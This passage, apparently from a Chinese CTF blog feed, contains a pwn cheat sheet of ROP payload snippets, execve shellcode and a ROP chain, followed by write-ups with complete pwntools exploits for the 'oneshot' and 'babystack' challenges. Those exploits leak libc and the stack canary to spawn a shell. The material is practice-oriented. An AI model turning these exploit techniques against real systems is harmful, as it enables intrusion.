p32(<span class="hljs-number">1</span>)<br>payload += p32(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p32(<span class="hljs-number">4</span>)<br>payload += p32(start_main)<br></code></pre></td></tr></table></figure><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p32(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br>payload += p32(pop3_ret)<br>payload += p32(<span class="hljs-number">0</span>)<span class="hljs-comment">#从哪里读取</span><br>payload += p32(bss_addr)<br>payload += p32(<span class="hljs-number">0x223</span>) <span class="hljs-comment">#长度</span><br></code></pre></td></tr></table></figure><h2 id="64"><a href="#64" class="headerlink" title="64"></a>64</h2><p>1.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">main_arena = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">88</span><br>log.success(<span class="hljs-string">&#x27;main arena: &#x27;</span>+<span class="hljs-built_in">hex</span>(main_arena))<br>libc_base = main_arena - <span class="hljs-number">0x3c4b20</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<span class="hljs-number">2.</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">libc_base = u64(sh.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x3C4B78</span><br>malloc_hook = libc_base + libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc_base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-string">&quot;__malloc_hook: &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br></code></pre></td></tr></table></figure><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rdi_ret)<br>payload += p64(binsh)<br>payload += p64(system)<br>sh.sendline(payload)<br></code></pre></td></tr></table></figure><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rdi_ret)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>])<br>payload += p64(start_main)<br><br></code></pre></td></tr></table></figure><h3 id="write-1"><a href="#write-1" class="headerlink" title="write"></a>write</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rdi_ret)<br>payload += p64(<span class="hljs-number">1</span>)<br>payload += p64(pop_rsi_r15_ret)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p64(<span class="hljs-number">1</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>])<br>payload += p64(start_main)<br><br></code></pre></td></tr></table></figure><h2 id="32"><a href="#32" class="headerlink" title="32"></a>32</h2><h3 id="read-1"><a href="#read-1" class="headerlink" title="read"></a>read</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload =p32(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]) <br>payload += p32(pop3_ret) <br>payload += p32(<span class="hljs-number">0</span>) <br>payload += p32(base)<br>payload += p32(<span class="hljs-number">0x500</span>)<br></code></pre></td></tr></table></figure><h3 id="write-2"><a href="#write-2" class="headerlink" title="write"></a>write</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p32(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>])<br>payload += p32(pop3_ret)<br>payload += p32(<span class="hljs-number">1</span>)<br>payload += p32(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p32(<span class="hljs-number">4</span>)<br>payload += p32(start_main)<br></code></pre></td></tr></table></figure><h2 id="64-1"><a href="#64-1" class="headerlink" title="64"></a>64</h2><h3 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rdi_ret)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br></code></pre></td></tr></table></figure><h3 id="system-“-bin-sh”-1"><a href="#system-“-bin-sh”-1" class="headerlink" title="system(“/bin/sh”)"></a>system(“/bin/sh”)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rdi_ret)<br>payload += p64(binsh)<br>payload += p64(system)<br>sh.sendline(payload)<br></code></pre></td></tr></table></figure><h3 id="read-2"><a href="#read-2" class="headerlink" title="read"></a>read</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rsi_ret)<br>payload += p64(elf.bss()) <br>payload += p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br></code></pre></td></tr></table></figure><h3 id="open"><a href="#open" class="headerlink" title="open"></a>open</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rdi_ret)<br>payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>payload += p64(pop_rsi_ret)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;open&#x27;</span>])<br></code></pre></td></tr></table></figure><h3 id="open-read-put"><a href="#open-read-put" class="headerlink" title="open_read_put"></a>open_read_put</h3><img src="/2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/image-20200128101042088.png" class="" title="image-20200128101042088"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(pop_rsi_ret)<br>payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br><br>payload += p64(pop_rdi_ret)<br>payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>payload += p64(pop_rsi_ret)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;open&#x27;</span>])<br><br>payload += p64(pop_rdi_ret)<br>payload += p64(<span class="hljs-number">4</span>)<span class="hljs-comment">#?</span><br>payload += p64(pop_rsi_ret)<br>payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br><br>payload += p64(pop_rdi_ret)<br>payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><br></code></pre></td></tr></table></figure><h2 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h2><p>可参考<a href="http://mrbelieve.tech/2020/01/24/ciscn_2019_s_9/">http://mrbelieve.tech/2020/01/24/ciscn_2019_s_9/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor    eax,eax</span><br><span class="hljs-string">push   eax</span><br><span class="hljs-string">push   0x68732f2f #//sh</span><br><span class="hljs-string">push   0x6e69622f # /bin</span><br><span class="hljs-string">mov    ebx,esp</span><br><span class="hljs-string">mov    ecx,eax</span><br><span class="hljs-string">mov    edx,eax</span><br><span class="hljs-string">mov    al,0xb</span><br><span class="hljs-string">int    0x80</span><br><span class="hljs-string">xor    eax,eax</span><br><span class="hljs-string">inc    eax</span><br><span class="hljs-string">int    0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode =asm(shellcode) <span class="hljs-comment">#使用shellcraft.sh打不通，估计是因为太长了</span><br>shell=<span class="hljs-string">&quot;sub esp,0x28;call esp&quot;</span><br>shell =asm(shell)<br></code></pre></td></tr></table></figure><h2 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">push <span class="hljs-number">0x67616c66</span><br>mov rdi,rsp <br>push <span class="hljs-number">2</span><br>pop rax<br>xor rsi,rsi<br>push <span class="hljs-number">32</span><br>pop rdx<br>syscall<br>mov rdi,rax<br>mov rsi,rsp<br>xor rax,rax<br>syscall<br>push <span class="hljs-number">1</span><br>pop rdi<br>push <span class="hljs-number">1</span><br>pop rax<br>syscall<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">push   <span class="hljs-number">0x42</span><br>pop    rax<br>inc    ah<br>cqo<br>push   rdx<br>movabs rdi, <span class="hljs-number">0x68732f2f6e69622f</span><br><br>push   rdi<br>push   rsp<br>pop    rsi<br>mov    r8, rdx<br>mov    r10, rdx<br>syscal<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">xor    %rsi,%rsi<br>push   %rsi<br>mov $<span class="hljs-number">0x68732f2f6e69622f</span>,%rdi<br>push   %rdi<br>push   %rsp<br>pop    %rdi<br>push  $<span class="hljs-number">0x3b</span><br>pop    %rax<br>cltd   <br>syscall <br></code></pre></td></tr></table></figure><h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><p><code>void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);</code></p><blockquote><p>参数start：指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p><p>参数length：代表将文件中多大的部分映射到内存。</p><p>参数prot：映射区域的保护方式。可以为以下几种方式的组合：<br>PROT_EXEC       映射区域可被执行<br>PROT_READ       映射区域可被读取<br>PROT_WRITE     映射区域可被写入<br>PROT_NONE      映射区域不能存取</p><p>参数flags：影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。<br>MAP_FIXED                如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。<br>MAP_SHARED          对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。<br>MAP_PRIVATE            对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。<br>MAP_ANONYMOUS  建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。<br>MAP_DENYWRITE   只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。<br>MAP_LOCKED          将映射区域锁定住，这表示该区域不会被置换（swap）。</p><p>参数fd：要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。</p><p>参数offset：文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。<br>————————————————<br>版权声明：本文为CSDN博主「为幸福写歌」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/yzy1103203312/article/details/78286360">https://blog.csdn.net/yzy1103203312/article/details/78286360</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack <br>p = <span class="hljs-keyword">lambda</span> x : pack(<span class="hljs-string">&#x27;I&#x27;</span>, x)<br>IMAGE_BASE_0 = <span class="hljs-number">0x08048000</span> <span class="hljs-comment"># ./simplerop</span><br>rebase_0 = <span class="hljs-keyword">lambda</span> x : p(x + IMAGE_BASE_0)<br>rop = <span class="hljs-string">&#x27;&#x27;</span><br>rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>rop += <span class="hljs-string">&#x27;/bin&#x27;</span><br>rop += rebase_0(<span class="hljs-number">0x0002682a</span>) <span class="hljs-comment"># 0x0806e82a: pop edx; ret; </span><br>rop += rebase_0(<span class="hljs-number">0x000a3060</span>)<br>rop += rebase_0(<span class="hljs-number">0x0005215d</span>) <span class="hljs-comment"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span><br>rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>rop += <span class="hljs-string">&#x27;/sh\x00&#x27;</span><br>rop += rebase_0(<span class="hljs-number">0x0002682a</span>) <span class="hljs-comment"># 0x0806e82a: pop edx; ret; </span><br>rop += rebase_0(<span class="hljs-number">0x000a3064</span>)<br>rop += rebase_0(<span class="hljs-number">0x0005215d</span>) <span class="hljs-comment"># 0x0809a15d: mov dword ptr [edx], eax; ret;</span><br>rop += pack(<span class="hljs-string">&#x27;I&#x27;</span>, pop_edx_ecx_ebx)<br>rop += p(<span class="hljs-number">0</span>)<br>rop += p(<span class="hljs-number">0</span>)<br>rop += rebase_0(<span class="hljs-number">0x000a3060</span>)<br>rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>rop += p(<span class="hljs-number">0x0000000b</span>)<br>rop += rebase_0(<span class="hljs-number">0x00026ef0</span>) <span class="hljs-comment"># 0x0806eef0: int 0x80; ret; </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>oneshot_tjctf_2016</title>
    <link href="/2020/02/05/oneshot_tjctf_2016/"/>
    <url>/2020/02/05/oneshot_tjctf_2016/</url>
    
    <content type="html"><![CDATA[<img src="/2020/02/05/oneshot_tjctf_2016/image-20200205020208419.png" class="" title="image-20200205020208419"><img src="/2020/02/05/oneshot_tjctf_2016/image-20200205020146218.png" class="" title="image-20200205020146218"><p>*v4，要用<code>str(elf.got[&#39;__libc_start_main&#39;])</code></p><p>接受要用<code>int(sh.recvuntil(&quot;\n&quot;,True),16)</code></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./oneshot_tjctf_2016&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./oneshot_tjctf_2016&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&#x27;/home/mrbelieve/Desktop/PWN/buu/libc/64-libc-2.23.so&#x27;</span>)<br>    payload = <span class="hljs-built_in">str</span>(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>    pause()<br>    sh.sendline(payload)<br>    sh.recvuntil(<span class="hljs-string">&quot;0x0000&quot;</span>)<br>    __libc_start_main = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br>    libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    one_gadget = <span class="hljs-number">0xf1147</span> <br>    payload = <span class="hljs-built_in">str</span>( libc  + one_gadget)<br>    sh.sendline(payload)<br><br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29303</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>leak_canary-others_babystack</title>
    <link href="/2020/02/04/leak_canary-others_babystack/"/>
    <url>/2020/02/04/leak_canary-others_babystack/</url>
    
    <content type="html"><![CDATA[<img src="/2020/02/04/leak_canary-others_babystack/image-20200204230127839.png" class="" title="image-20200204230127839"><p>Full RELRO GOT表只读</p><img src="/2020/02/04/leak_canary-others_babystack/image-20200204230141663.png" class="" title="image-20200204230141663"><p>s申请的是0x80，但读入0x100。并且canary在stack -0x8的地方</p><p>先泄露canary，puts函数在输出时，只有遇到\x00才会结束，用\n覆盖canary的第一字节\x00，从而获得canary</p><p><code>payload = cyclic(0x90-0x8)</code></p><img src="/2020/02/04/leak_canary-others_babystack/image-20200204230829836.png" class="" title="image-20200204230829836"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">sh.recvuntil(<span class="hljs-string">&quot;iaab\n&quot;</span>)<br>canary =  u64(sh.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;canary------&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br></code></pre></td></tr></table></figure><p>然后构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>():</span><br>    sh.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">quit</span>():</span><br>    sh.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>payload = cyclic(<span class="hljs-number">0x90</span>-<span class="hljs-number">0x8</span>)<br>store(payload)<br>printf()<br>sh.recvuntil(<span class="hljs-string">&quot;iaab\n&quot;</span>)<br>canary =  u64(sh.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;canary------&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br>payload = cyclic(<span class="hljs-number">0x90</span>-<span class="hljs-number">0x8</span>)<br>payload += p64(canary)<br>payload += cyclic(<span class="hljs-number">0x8</span>)<br>payload += p64(pop_rdi_ret)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload += p64(main)<br>store(payload)<br>quit()<br></code></pre></td></tr></table></figure><p><strong>必须要quit了才会继续运行到我们的溢出部分</strong></p><p>后面就是常规了</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        <span class="hljs-comment">#lib = ELF(&#x27;/home/mrbelieve/Desktop/PWN/buu/libc/64-libc-2.23.so&#x27;)</span><br>    pop_rdi_ret = <span class="hljs-number">0x0400a93</span><br>    main = <span class="hljs-number">0x400908</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">store</span>(<span class="hljs-params">payload</span>):</span><br>        sh.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>        sh.sendline(payload)<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>():</span><br>        sh.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">quit</span>():</span><br>        sh.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">0x90</span>-<span class="hljs-number">0x8</span>)<br>    store(payload)<br>    printf()<br>    sh.recvuntil(<span class="hljs-string">&quot;iaab\n&quot;</span>)<br>    canary =  u64(sh.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>    log.success(<span class="hljs-string">&quot;canary------&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br>    payload = cyclic(<span class="hljs-number">0x90</span>-<span class="hljs-number">0x8</span>) <br>    payload += p64(canary) <br>    payload += cyclic(<span class="hljs-number">0x8</span>)<br>    payload += p64(pop_rdi_ret)<br>    payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>    payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    payload += p64(main)<br>    store(payload)<br>    quit()<br>    <br>    __libc_start_main = u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>    libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    binsh = libc + lib.search(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>).<span class="hljs-built_in">next</span>()<br>    <br>    log.success(<span class="hljs-string">&quot;libc: &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br>    log.success(<span class="hljs-string">&quot;system: &quot;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&quot;binsh: &quot;</span> + <span class="hljs-built_in">hex</span>(binsh))<br><br>    payload = cyclic(<span class="hljs-number">0x90</span>-<span class="hljs-number">0x8</span>)<br>    payload += p64(canary)<br>    payload += cyclic(<span class="hljs-number">0x8</span>)<br>    payload += p64(pop_rdi_ret)<br>    payload += p64(binsh)<br>    payload += p64(system)<br>    store(payload)<br>    quit()<br>    